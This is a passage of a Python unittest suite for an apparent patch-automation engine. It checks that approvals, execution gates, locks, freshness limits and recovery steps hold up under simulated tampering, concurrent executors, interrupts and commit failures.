                    finding = next(r for r in engine.triage("fixture-host") if r["status"] == "affected")
                    plan = engine.plan(finding["id"])
                    engine.approve(plan["id"], "op")
                    key = store.connection.execute("SELECT id FROM objects WHERE kind=? LIMIT 1", (kind,)).fetchone()[0]
                    store.connection.execute("DROP TRIGGER immutable_objects_update")
                    store.connection.execute("UPDATE objects SET body='{}' WHERE id=?", (key,))
                    with self.assertRaisesRegex(ValidationError, "hash"):
                        engine.execute(plan["id"])
                    self.assertNotIn("apply", backend.calls)
                    self.assertFalse(backend.gate.exists())

    def test_approval_head_substitution_cannot_authorize_another_plan(self):
        first = self.prepare()
        self.at += 1
        second = self.prepare()
        approval_id = self.store.connection.execute("SELECT approval_id FROM approval_heads WHERE plan_id=?", (first["id"],)).fetchone()[0]
        with self.store.transaction():
            self.store.connection.execute("UPDATE approval_heads SET approval_id=? WHERE plan_id=?", (approval_id, second["id"]))
        with self.assertRaisesRegex(PolicyError, "Approval expired or does not match"):
            self.engine.execute(second["id"])

    def test_target_lock_covers_preflight_gate_mutation_verification_and_finish(self):
        plan = self.prepare()
        self.backend.calls.clear()
        result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "succeeded")
        calls = self.backend.calls
        self.assertEqual(calls[0], "lock")
        self.assertEqual(calls[-1], "unlock")
        self.assertLess(calls.index("resolve"), calls.index("begin"))
        self.assertLess(calls.index("begin"), calls.index("apply"))
        self.assertLess(calls.index("write"), len(calls) - 1 - calls[::-1].index("inspect"))
        self.assertEqual(calls[-2], "finish:succeeded")

    def test_competing_executors_mutate_once_with_one_atomic_start_event(self):
        plan = self.prepare()
        barrier = threading.Barrier(2)
        results = []
        def execute():
            with Store(Path(self.temp.name) / "main.db") as store:
                backend = SyntheticBackend(self.temp.name, lambda: self.at)
                engine = Engine(store, self.provider, backend, clock=lambda: self.at)
                barrier.wait(timeout=5)
                try:
                    results.append(engine.execute(plan["id"])["status"])
                except (BackendError, PolicyError):
                    results.append("denied")
        threads = [threading.Thread(target=execute) for _ in range(2)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=10)
            self.assertFalse(thread.is_alive())
        self.assertCountEqual(results, ["succeeded", "denied"])
        starts = [row for row in self.engine.audit() if row["event"] == "execution-start"]
        self.assertEqual(len(starts), 1)
        self.assertEqual(self.backend.inspect()["packages"][0]["version"], target()["to_version"])

    def test_gate_is_written_before_claim_commit_and_finish_after_outcome_commit(self):
        plan = self.prepare()
        reader = sqlite3.connect(Path(self.temp.name) / "main.db", isolation_level=None)
        self.addCleanup(reader.close)
        def at_begin():
            self.assertTrue(self.backend.gate.exists())
            self.assertEqual(reader.execute("SELECT status FROM plan_status WHERE plan_id=?", (plan["id"],)).fetchone()[0], "approved")
        def at_apply():
            self.assertEqual(reader.execute("SELECT status FROM plan_status WHERE plan_id=?", (plan["id"],)).fetchone()[0], "executing")
        def at_finish():
            self.assertEqual(reader.execute("SELECT status FROM plan_status WHERE plan_id=?", (plan["id"],)).fetchone()[0], "succeeded")
            self.assertEqual(reader.execute("SELECT COUNT(*) FROM outcomes").fetchone()[0], 1)
        self.backend.on_begin, self.backend.on_download, self.backend.on_finish = at_begin, at_apply, at_finish
        self.engine.execute(plan["id"])

    def test_second_store_cannot_change_source_inventory_or_approval_after_callback(self):
        plan = self.prepare()
        other = Store(Path(self.temp.name) / "main.db")
        self.addCleanup(other.close)
        other.connection.execute("PRAGMA busy_timeout=1")
        def attempt_changes():
            for action in (lambda: other.record_source("ubuntu", self.at, error="changed"),
                           lambda: other.save_inventory(inventory()),
                           lambda: other.approve({"plan_id": plan["id"], "policy_digest": "b" * 64})):
                with self.assertRaisesRegex(sqlite3.OperationalError, "locked"), other.transaction():
                    action()
        self.backend.after_callback = attempt_changes
        self.assertEqual(self.engine.execute(plan["id"])["status"], "succeeded")

    def test_claim_recording_failure_before_commit_withdraws_the_new_gate(self):
        for fault in (sqlite3.OperationalError("Synthetic claim persistence fault"), KeyboardInterrupt()):
            with self.subTest(fault=type(fault).__name__):
                plan = self.prepare()
                original = self.store.claim
                def fail(*args, **kwargs):
                    original(*args, **kwargs)
                    raise fault
                self.backend.calls.clear()
                with patch.object(self.store, "claim", side_effect=fail), \
                        self.assertRaises((IndeterminateError, KeyboardInterrupt)):
                    self.engine.execute(plan["id"])
                # The claim rolled back before commit, so no mutation could start.
                self.assertFalse(self.backend.gate.exists())
                self.assertIn("cancel", self.backend.calls)
                self.assertNotIn("apply", self.backend.calls)
                self.assertEqual(self.store.plan(plan["id"])["status"], "approved")
                self.assertEqual(self.engine.execute(plan["id"])["status"], "succeeded")
                self.backend.path.write_text(canonical(inventory()))
                self.at += 1

    def test_recover_finalizes_and_clears_a_gate_whose_claim_never_committed(self):
        plan = self.prepare()
        def interrupt():
            raise KeyboardInterrupt
        self.backend.on_begin = interrupt
        with self.assertRaises(KeyboardInterrupt):
            self.engine.execute(plan["id"])
        self.backend.on_begin = None
        self.assertTrue(self.backend.gate.exists())
        self.assertEqual(self.store.plan(plan["id"])["status"], "approved")
        before = self.backend.generation()
        result = self.engine.recover(plan["id"])
        self.assertEqual(result["status"], "failed")
        self.assertFalse(result["result"]["verified"])
        self.assertIn("never committed", result["result"]["reason"])
        self.assertFalse(self.backend.gate.exists())
        self.assertNotEqual(self.backend.generation(), before)
        self.assertNotIn("apply", self.backend.calls)
        events = [row["event"] for row in self.engine.audit()]
        self.assertLess(events.index("execution-recovered"), events.index("recovery-gate-cleared"))
        # Generation rotation forces fresh collection before any new plan.
        finding = next(row for row in self.engine.triage("fixture-host") if row["status"] == "affected")
        with self.assertRaisesRegex(PolicyError, "generation"):
            self.engine.plan(finding["id"])
        self.assertEqual(self.prepare()["status"], "approved")

    def test_outcome_persistence_failure_retains_executing_and_gate(self):
        plan = self.prepare()
        with patch.object(self.store, "save_outcome", side_effect=sqlite3.OperationalError("disk failure")), self.assertRaises(IndeterminateError):
            self.engine.execute(plan["id"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "executing")
        self.assertTrue(self.backend.gate.exists())
        self.assertNotIn("finish:succeeded", self.backend.calls)
        self.assertEqual(self.engine.recover(plan["id"])["status"], "needs_attention")
        self.assertTrue(self.backend.gate.exists())

    def test_outcome_commit_failure_before_or_after_durability_retains_gate(self):
        for committed in (False, True):
            with self.subTest(committed=committed):
                plan = self.prepare()
                original = self.store.transaction
                injected = False
                @contextmanager
                def transaction():
                    nonlocal injected
                    with original():
                        yield self.store
                        if not committed and not injected and self.store.plan(plan["id"])["status"] == "succeeded":
                            injected = True
                            raise sqlite3.OperationalError("Synthetic failed COMMIT")
                    if committed and not injected and self.store.plan(plan["id"])["status"] == "succeeded":
                        injected = True
                        raise sqlite3.OperationalError("Synthetic uncertain COMMIT acknowledgement")
                with patch.object(self.store, "transaction", transaction), self.assertRaises(IndeterminateError):
                    self.engine.execute(plan["id"])
                self.assertTrue(injected)
                self.assertTrue(self.backend.gate.exists())
                self.assertEqual(self.store.plan(plan["id"])["status"], "succeeded" if committed else "executing")
                resolution = self.engine.resolve_recovery(plan["id"], "op", "Inspected fixture after uncertain commit")
                self.assertEqual(resolution["status"], "succeeded" if committed else "needs_attention")
                self.assertFalse(self.backend.gate.exists())
                self.backend.path.write_text(canonical(inventory()))
                self.at += 1

    def test_claim_commit_acknowledgement_failure_keeps_committed_execution_gate(self):
        plan = self.prepare()
        original = self.store.transaction
        @contextmanager
        def transaction():
            with original():
                yield self.store
            if self.store.plan(plan["id"])["status"] == "executing":
                raise sqlite3.OperationalError("Synthetic uncertain claim commit")
        with patch.object(self.store, "transaction", transaction), self.assertRaises(IndeterminateError):
            self.engine.execute(plan["id"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "executing")
        self.assertTrue(self.backend.gate.exists())
        self.assertNotIn("apply", self.backend.calls)

    def test_gate_clear_failure_after_committed_success_is_reported_as_indeterminate(self):
        plan = self.prepare()
        def fail():
            raise BackendError("Synthetic gate removal failed")
        self.backend.on_finish = fail
        with self.assertRaises(IndeterminateError):
            self.engine.execute(plan["id"])
        self.assertTrue(self.backend.gate.exists())
        self.assertEqual(self.store.plan(plan["id"])["status"], "succeeded")
        result = self.engine.resolve_recovery(plan["id"], "op", "Checked prior committed verification and orphaned gate")
        self.assertEqual(result["status"], "succeeded")
        self.assertFalse(result["verified"])

    def test_repeated_callback_after_possible_installation_retains_gate(self):
        plan = self.prepare()
        original = self.backend.apply
        def apply(target, policy, *, before_mutation):
            result = original(target, policy, before_mutation=before_mutation)
            before_mutation()
            return result
        with patch.object(self.backend, "apply", apply):
            result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "needs_attention")
        self.assertTrue(self.backend.gate.exists())

    def test_callback_rejects_expired_plan_feed_and_inventory_after_preparation(self):
        self.policy["mode"] = "auto"
        for field in ("plan_ttl", "max_feed_age", "max_inventory_age"):
            with self.subTest(field=field):
                old = self.policy[field]
                self.policy[field] = 5
                plan = self.prepare(approve=False)
                self.backend.on_download = lambda: setattr(self, "at", self.at + 6)
                self.assertEqual(self.engine.execute(plan["id"])["status"], "failed")
                self.assertFalse(self.backend.gate.exists())
                self.assertNotIn("write", self.backend.calls)
                self.policy[field] = old
                self.at += 1

    def test_future_backend_observation_cannot_complete_verification(self):
        plan = self.prepare()
        original = self.backend.inspect
        def inspect():
            value = original()
            if "write" in self.backend.calls:
                value["observed_at"] = self.at + 1
            return value
        with patch.object(self.backend, "inspect", inspect):
            self.assertEqual(self.engine.execute(plan["id"])["status"], "needs_attention")
        self.assertTrue(self.backend.gate.exists())

    def test_confirmed_download_failure_commits_failed_then_clears_gate_and_never_retries(self):
        plan = self.prepare()
        self.backend.failure = "before"
        result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "failed")
        self.assertFalse(self.backend.gate.exists())
        self.assertIsNotNone(result["inventory_id"])
        self.assertNotIn("write", self.backend.calls)
        self.assertNotIn("secret", canonical(self.engine.audit()))
        with self.assertRaises(PolicyError):
            self.engine.execute(plan["id"])

    def test_uncertain_installation_retains_gate_across_different_databases(self):
        plan = self.prepare()
        self.backend.failure = "after"
        result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "needs_attention")
        self.assertTrue(self.backend.gate.exists())
        other_store, other_backend, other = self.second_engine()
        # A separate candidate exists in another database before trying the same gate.
        self.backend.path.write_text(canonical(inventory()))
        other.ingest("ubuntu", source())
        other.inventory()
        finding = next(r for r in other.triage("fixture-host") if r["status"] == "affected")
        second = other.plan(finding["id"])
        other.approve(second["id"], "other")
        with self.assertRaisesRegex(BackendError, "gate"):
            other.execute(second["id"])
        self.assertNotIn("apply", other_backend.calls)
        self.assertEqual(other_store.plan(second["id"])["status"], "approved")

    def test_interrupts_before_or_after_apply_retain_gate_and_attention_status(self):
        for failure in ("interrupt-before", "interrupt-after"):
            with self.subTest(failure=failure):
                plan = self.prepare()
                self.backend.failure = failure
                with self.assertRaises(KeyboardInterrupt):
                    self.engine.execute(plan["id"])
                self.assertEqual(self.store.plan(plan["id"])["status"], "needs_attention")
                self.assertTrue(self.backend.gate.exists())
                self.engine.resolve_recovery(plan["id"], "op", "Inspected synthetic state; no automatic rollback claimed")
                self.backend.path.write_text(canonical(inventory()))
                self.at += 1

    def test_interrupt_during_gate_creation_preserves_gate_without_committed_claim(self):
        plan = self.prepare()
        def interrupt():
            raise KeyboardInterrupt
        self.backend.on_begin = interrupt
        with self.assertRaises(KeyboardInterrupt):
            self.engine.execute(plan["id"])
        self.assertTrue(self.backend.gate.exists())
        self.assertEqual(self.store.plan(plan["id"])["status"], "approved")
        self.engine.resolve_recovery(plan["id"], "operator", "Inspected abandoned preclaim gate")
        self.assertEqual(self.store.plan(plan["id"])["status"], "needs_attention")

    def test_unknown_backend_fault_is_not_a_confirmed_premutation_failure(self):
        plan = self.prepare()
        self.backend.failure = "unknown"
        self.assertEqual(self.engine.execute(plan["id"])["status"], "needs_attention")
        self.assertTrue(self.backend.gate.exists())

    def test_zero_exit_or_backend_success_report_without_state_change_is_not_success(self):
        plan = self.prepare()
        self.backend.write = False
        self.assertEqual(self.engine.execute(plan["id"])["status"], "needs_attention")
        self.assertTrue(self.backend.gate.exists())

    def test_backend_omitting_callback_cannot_certify_success(self):
        plan = self.prepare()
        self.backend.callback = False
        self.assertEqual(self.engine.execute(plan["id"])["status"], "needs_attention")
        self.assertTrue(self.backend.gate.exists())

    def test_unrelated_drift_missing_packages_wrong_source_and_unready_target_fail_verification(self):
        changes = [lambda data: data["packages"][1].update(version="3.0"),
                   lambda data: data["packages"].pop(),
                   lambda data: data["packages"][0].update(source_version="1:1.0-1"),
                   lambda data: data["packages"][0].update(status="half-configured"),
                   lambda data: data["packages"][1].update(held=True),
                   lambda data: data["packages"].append({**data["packages"][1], "name": "new-package"}),
                   lambda data: data.update(complete=False)]
        for change in changes:
            with self.subTest(change=change):
                plan = self.prepare()
                self.backend.post_change = change
                self.assertEqual(self.engine.execute(plan["id"])["status"], "needs_attention")
                self.assertTrue(self.backend.gate.exists())
                self.engine.resolve_recovery(plan["id"], "op", "Inspected synthetic drift")
                self.backend.path.write_text(canonical(inventory()))
                self.at += 1

    def test_failed_post_observation_returns_null_inventory_and_retains_gate(self):
        plan = self.prepare()
        self.backend.failure = "inspection"
        result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "needs_attention")
        self.assertIsNone(result["inventory_id"])
        self.assertTrue(self.backend.gate.exists())

    def test_callback_rejects_expired_approval_after_download_before_write(self):
        plan = self.prepare()
        self.backend.on_download = lambda: setattr(self, "at", self.at + 100)
        result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "failed")
        self.assertFalse(self.backend.gate.exists())
        self.assertNotIn("write", self.backend.calls)

    def test_callback_reloads_policy_after_download(self):
        plan = self.prepare()
        self.backend.on_download = lambda: self.policy.update(mode="observe")
        self.assertEqual(self.engine.execute(plan["id"])["status"], "failed")
        self.assertNotIn("write", self.backend.calls)
        self.assertFalse(self.backend.gate.exists())

    def test_callback_rechecks_artifact_and_full_inventory_after_download(self):
        for change in (lambda: self.backend.target.update(sha256="e" * 64),
                       lambda: self.backend.path.write_text(canonical({**inventory(), "complete": False}))):
            with self.subTest(change=change):
                plan = self.prepare()
                self.backend.on_download = change
                self.assertEqual(self.engine.execute(plan["id"])["status"], "failed")
                self.assertFalse(self.backend.gate.exists())
                self.assertNotIn("write", self.backend.calls)
                self.backend.path.write_text(canonical(inventory()))
                self.backend.target = target()
                self.at += 1

    def test_policy_reloaded_after_claim_transaction_release(self):
        plan = self.prepare()
        original = self.store.transaction
        changed = False
        @contextmanager
        def transaction():
            nonlocal changed
            with original():
                yield self.store
            if not changed and self.store.plan(plan["id"])["status"] == "executing":
                changed = True
                self.policy["mode"] = "observe"
        with patch.object(self.store, "transaction", transaction):
            result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "failed")
        self.assertNotIn("apply", self.backend.calls)
        self.assertFalse(self.backend.gate.exists())

    def test_recover_abandoned_execution_never_reruns_or_reports_success(self):
        plan = self.prepare()
        with self.backend.lock("fixture-host"):
            self.backend.begin(plan["id"])
            with self.store.transaction():
                self.store.claim(plan["id"], self.at, expected=("approved",))
        result = self.engine.recover(plan["id"])
        self.assertEqual(result["status"], "needs_attention")
        self.assertFalse(result["result"]["verified"])
        self.assertTrue(self.backend.gate.exists())
        self.assertNotIn("apply", self.backend.calls)
        resolved = self.engine.resolve_recovery(plan["id"], "operator", "Checked fixture package state; future action needs a new plan")
        self.assertTrue(resolved["gate_cleared"])
        self.assertEqual(resolved["status"], "needs_attention")
        self.assertFalse(resolved["verified"])
        self.assertIn("recovery-lock", self.backend.calls)
        with self.assertRaises(PolicyError):
            self.engine.execute(plan["id"])

    def test_recovery_cannot_take_active_target_lock(self):
        plan = self.prepare()
        other_backend = SyntheticBackend(self.temp.name, lambda: self.at)
        with other_backend.lock("fixture-host"):
            with self.assertRaisesRegex(BackendError, "locked"):
                self.engine.recover(plan["id"])
            with self.assertRaisesRegex(BackendError, "locked"):
                self.engine.resolve_recovery(plan["id"], "op", "Cannot attest while active")

    def test_review_final_matching_cannot_outlive_plan_approval_feed_or_inventory(self):
        from autoprotect.engine import verify_affected as original_match
        for deadline in ("plan_ttl", "approval_ttl", "max_feed_age", "max_inventory_age"):
            with self.subTest(deadline=deadline):
                self.policy = policy()
                self.policy[deadline] = 5
                self.backend.path.write_text(canonical(inventory()))
                plan = self.prepare()
                calls = 0
                def matching(*args, **kwargs):
                    nonlocal calls
                    result = original_match(*args, **kwargs)
                    if "before-mutation" in self.backend.calls:
                        calls += 1
                        if calls == 2:  # Final validation's costly pass, after its old time read.
                            self.at += 6
                    return result
                self.backend.calls.clear()
                with patch("autoprotect.engine.verify_affected", matching):
                    result = self.engine.execute(plan["id"])
                self.assertEqual(calls, 2)
                self.assertEqual(result["status"], "failed")
                self.assertNotIn("write", self.backend.calls)
                self.assertFalse(self.backend.gate.exists())
                self.at += 1

    def test_review_final_clock_rechecks_the_independent_preflight_observation(self):
        from autoprotect.engine import verify_affected as original_match
        self.policy.update(plan_ttl=1000, approval_ttl=1000, max_feed_age=1000, max_inventory_age=5)
        plan = self.prepare()
        original_inspect = self.backend.inspect
        calls = 0
        def inspect():
            body = original_inspect()
            body["observed_at"] -= 4
            return body
        def matching(*args, **kwargs):
            nonlocal calls
            result = original_match(*args, **kwargs)
            if "before-mutation" in self.backend.calls:
                calls += 1
                if calls == 2:
                    self.at += 2  # Head remains fresh; the independently collected preflight is now stale.
            return result
        with patch.object(self.backend, "inspect", inspect), patch("autoprotect.engine.verify_affected", matching):
            result = self.engine.execute(plan["id"])
        self.assertEqual(result["status"], "failed")
        self.assertEqual(calls, 2)
        self.assertNotIn("write", self.backend.calls)

    def test_review_final_matching_cannot_keep_revoked_policy_authority(self):
        from autoprotect.engine import verify_affected as original_match
        plan = self.prepare()
        calls = 0
        def matching(*args, **kwargs):
            nonlocal calls
            result = original_match(*args, **kwargs)
            if "before-mutation" in self.backend.calls:
                calls += 1
                if calls == 2:
                    self.policy["mode"] = "observe"
            return result
        with patch("autoprotect.engine.verify_affected", matching):
            result = self.engine.execute(plan["id"])
        self.assertEqual(calls, 2)
        self.assertEqual(result["status"], "failed")
        self.assertNotIn("write", self.backend.calls)
        self.assertFalse(self.backend.gate.exists())

    def test_review_resolution_invalidates_other_database_and_requires_actual_same_second_collection(self):
        first = self.prepare()
        self.at += 1
        other_store, other_backend, other = self.second_engine()
        other.ingest("ubuntu", source())
        old_inventory = other.inventory()
        finding = next(row for row in other.triage("fixture-host") if row["status"] == "affected")
        old_plan = other.plan(finding["id"])
        other.approve(old_plan["id"], "other")
        self.backend.failure = "unknown"
        self.engine.execute(first["id"])
        before = self.backend.generation()
        self.engine.resolve_recovery(first["id"], "operator", "Inspected unchanged synthetic package state")
        self.assertNotEqual(self.backend.generation(), before)
        with self.assertRaisesRegex(PolicyError, "generation|collect"):
            other.execute(old_plan["id"])
        with self.assertRaisesRegex(PolicyError, "generation|collect"):
            other.plan(finding["id"])
        new_inventory = other.inventory()
        self.assertEqual(new_inventory, old_inventory)  # Same content and clock second; context must still change.
        fresh_plan = other.plan(finding["id"])
        self.assertNotEqual(fresh_plan["id"], old_plan["id"])
        self.assertEqual(fresh_plan["body"]["target_generation"], other_backend.generation())
        other.approve(fresh_plan["id"], "renewed")
        self.assertEqual(other.execute(fresh_plan["id"])["status"], "succeeded")
        self.assertEqual(other_store.plan(old_plan["id"])["status"], "stale")

    def test_review_recollection_cannot_revive_an_old_plan_generation(self):
        first = self.prepare()
        self.at += 1
        other_store, _, other = self.second_engine()
        other.ingest("ubuntu", source())
        other.inventory()
        finding = next(row for row in other.triage("fixture-host") if row["status"] == "affected")
        old_plan = other.plan(finding["id"])
        other.approve(old_plan["id"], "other")
        self.backend.failure = "unknown"
        self.engine.execute(first["id"])
        self.engine.resolve_recovery(first["id"], "operator", "Checked unchanged fixture state")
        other.inventory()
        with self.assertRaisesRegex(PolicyError, "Plan recovery generation"):
            other.execute(old_plan["id"])
        self.assertEqual(other_store.plan(old_plan["id"])["status"], "stale")
        self.assertNotIn("write", self.backend.calls)

    def test_review_auto_mode_recovery_requires_collection_and_new_plan_but_not_approval(self):
        self.policy["mode"] = "auto"
        first = self.prepare(approve=False)
        self.at += 1
        other_store, _, other = self.second_engine()
        other.ingest("ubuntu", source())
        other.inventory()
        finding = next(row for row in other.triage("fixture-host") if row["status"] == "affected")
        previous = other.plan(finding["id"])
        self.backend.failure = "unknown"
        self.engine.execute(first["id"])
        self.engine.resolve_recovery(first["id"], "op", "Checked fixture state before new automatic work")
        with self.assertRaises(PolicyError):
            other.execute(previous["id"])
        self.at += 1
        with self.assertRaisesRegex(PolicyError, "collect"):
            other.plan(finding["id"])
        other.inventory()
        new = other.plan(finding["id"])
        self.assertIsNone(other_store.approval(new["id"]))
        self.assertEqual(other.execute(new["id"])["status"], "succeeded")

    def test_review_import_or_missing_context_cannot_supply_collection_generation(self):
        plan = self.prepare()
        body = self.backend.inspect()
        for context in ({}, {"backend": "ubuntu-apt", "target_generation": self.backend.generation()}):
            with self.subTest(context=context):
                with self.store.transaction():
                    self.store.save_inventory(body, **context)
                with self.assertRaisesRegex(PolicyError, "Collection context"):
                    self.engine.plan(plan["body"]["finding_id"])
        self.engine.inventory({**body, "backend": "simulator", "target_generation": self.backend.generation()})
        self.assertIsNone(self.store.inventory_context("fixture-host")["backend"])
        finding = next(row for row in self.engine.triage("fixture-host") if row["status"] == "affected")
        with self.assertRaisesRegex(PolicyError, "Collection context"):
            self.engine.plan(finding["id"])

    def test_review_collection_straddling_generation_rotation_is_not_saved(self):
        plan = self.prepare()
        self.backend.failure = "unknown"
        self.engine.execute(plan["id"])
        original = self.backend.inspect
        previous = self.store.inventory_context("fixture-host")
        other = SyntheticBackend(self.temp.name, lambda: self.at)
        def collect():
            body = original()
            with other.lock("fixture-host", recovery=True):
                other.clear_gate(plan["id"], "Synthetic concurrent explicit resolution")
            return body
        with patch.object(self.backend, "inspect", collect), self.assertRaisesRegex(PolicyError, "during observation"):
            self.engine.inventory()
        self.assertEqual(self.store.inventory_context("fixture-host"), previous)
        with self.assertRaisesRegex(PolicyError, "collect"):
            self.engine.plan(plan["body"]["finding_id"])

    def test_review_wrong_or_absent_gate_does_not_finalize_approved_plan(self):
        first = self.prepare()
        self.at += 1
        second = self.prepare()
        for present in (False, True):
            with self.subTest(present=present):
                if present:
                    with self.backend.lock("fixture-host"):
                        self.backend.begin(first["id"])
                before = self.store.plan(second["id"])
                audit = self.engine.audit()
                with self.assertRaises(BackendError):
                    self.engine.resolve_recovery(second["id"], "operator", "This must not resolve another gate")
                self.assertEqual(self.store.plan(second["id"]), before)
                self.assertIsNone(self.store.outcome(second["id"]))
                self.assertEqual(self.engine.audit(), audit)
        self.engine.resolve_recovery(first["id"], "operator", "Resolve the actual retained gate")

    def test_review_malformed_gate_inspection_and_exact_attestation(self):
        plan = self.prepare()
        self.backend.gate.write_bytes(b'{"partial":')
        expected = {"malformed": True, "digest": hashlib.sha256(b'{"partial":').hexdigest()}
        evidence = self.engine.recovery_status(plan["id"])
        self.assertEqual(evidence["gate"], expected)
        self.assertFalse(evidence["prior_plan_identity_verified"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "approved")
        for value in (None, "a" * 64):
            with self.subTest(digest=value), self.assertRaises(BackendError):
                self.engine.resolve_recovery(plan["id"], "operator", "Inspected malformed fixture gate", malformed_digest=value)
        self.assertEqual(self.store.plan(plan["id"])["status"], "approved")
        resolved = self.engine.resolve_recovery(plan["id"], "operator", "Inspected malformed fixture gate",
                                               malformed_digest=expected["digest"])
        self.assertFalse(resolved["prior_plan_identity_verified"])
        self.assertFalse(resolved["verified"])
        # An unidentifiable gate cannot finalize a plan that never executed.
        self.assertEqual(resolved["status"], "approved")
        self.assertIsNone(self.store.outcome(plan["id"]))
        self.assertNotEqual(resolved["target_generation"], "0" * 64)
        attestation = next(row for row in self.engine.audit() if row["event"] == "recovery-resolution-requested")
        self.assertFalse(attestation["details"]["prior_plan_identity_verified"])
        self.assertEqual(attestation["details"]["gate"], expected)

    def test_malformed_gate_resolution_finalizes_only_an_executing_plan(self):
        plan = self.prepare()
        with self.store.transaction():
            self.store.claim(plan["id"], self.at, expected=("approved",))
        self.backend.gate.write_bytes(b"partial")
        digest_value = hashlib.sha256(b"partial").hexdigest()
        resolved = self.engine.resolve_recovery(plan["id"], "operator", "Inspected abandoned malformed gate",
                                               malformed_digest=digest_value)
        self.assertEqual(resolved["status"], "needs_attention")
        self.assertFalse(resolved["prior_plan_identity_verified"])
        self.assertFalse(self.backend.gate.exists())

    def test_review_valid_gate_never_accepts_a_malformed_override(self):
        first = self.prepare()
        self.at += 1
        second = self.prepare()
        with self.backend.lock("fixture-host"):
            self.backend.begin(first["id"])
        exact_raw_digest = hashlib.sha256(self.backend.gate.read_bytes()).hexdigest()
        for requested in (first["id"], second["id"]):
            with self.subTest(plan=requested), self.assertRaisesRegex(BackendError, "Exact"):
                self.engine.resolve_recovery(requested, "operator", "Override must not clear a valid gate",
                                             malformed_digest=exact_raw_digest)
            self.assertEqual(self.store.plan(requested)["status"], "approved")
            self.assertIsNone(self.store.outcome(requested))
        inspected = self.engine.recovery_status(second["id"])
        self.assertEqual(inspected["gate"], {"plan_id": first["id"]})
        self.assertFalse(inspected["prior_plan_identity_verified"])
        self.assertEqual(self.backend.generation(), "0" * 64)

    def test_review_stale_malformed_digest_and_missing_gate_leave_status_unchanged(self):
        plan = self.prepare()
        before = self.engine.audit()
        self.assertIsNone(self.engine.recovery_status(plan["id"])["gate"])
        self.backend.gate.write_bytes(b"partial-one")
        evidence = self.engine.recovery_status(plan["id"])["gate"]
        self.backend.gate.write_bytes(b"partial-two")
        with self.assertRaises(BackendError):
            self.engine.resolve_recovery(plan["id"], "op", "Outdated evidence cannot clear current gate",
                                         malformed_digest=evidence["digest"])
        self.assertEqual(self.store.plan(plan["id"])["status"], "approved")
        self.assertIsNone(self.store.outcome(plan["id"]))
        self.assertEqual(self.engine.audit(), before)
        self.assertEqual(self.backend.gate.read_bytes(), b"partial-two")

    def test_review_recover_checks_gate_before_recording_abandoned_outcome(self):
        plan = self.prepare()
        with self.store.transaction():
            self.store.claim(plan["id"], self.at, expected=("approved",))
        for evidence in (None, canonical({"plan_id": "a" * 64}).encode("ascii"), b"partial"):
            with self.subTest(evidence=evidence):
                if evidence is not None:
                    self.backend.gate.write_bytes(evidence)
                with self.assertRaises(BackendError):
                    self.engine.recover(plan["id"])
                self.assertEqual(self.store.plan(plan["id"])["status"], "executing")
                self.assertIsNone(self.store.outcome(plan["id"]))

    def test_review_resolution_persistence_failure_precedes_generation_rotation(self):
        plan = self.prepare()
        with self.backend.lock("fixture-host"):
            self.backend.begin(plan["id"])
        with patch.object(self.store, "event", side_effect=sqlite3.OperationalError("Synthetic audit failure")), self.assertRaises(sqlite3.OperationalError):
            self.engine.resolve_recovery(plan["id"], "op", "Attestation must commit before generation rotation")
        self.assertEqual(self.store.plan(plan["id"])["status"], "approved")
        self.assertIsNone(self.store.outcome(plan["id"]))
        self.assertTrue(self.backend.gate.exists())
        self.assertEqual(self.backend.generation(), "0" * 64)

    def test_resolution_requires_exact_gate_and_bounded_actor_reason(self):
        plan = self.prepare()
        self.backend.failure = "unknown"
        self.engine.execute(plan["id"])
        self.at += 1
        second = self.prepare()
        with self.assertRaisesRegex(BackendError, "Exact"):
            self.engine.resolve_recovery(second["id"], "operator", "Wrong gate is never cleared")
        self.assertTrue(self.backend.gate.exists())
        for actor, reason in (("bad\nactor", "reason"), ("op", ""), ("op", "secret\x1b")):
            with self.assertRaises(ValidationError):
                self.engine.resolve_recovery(plan["id"], actor, reason)
        self.assertFalse(any(row["event"] == "recovery-gate-cleared" for row in self.engine.audit()))


if __name__ == "__main__":
    unittest.main()
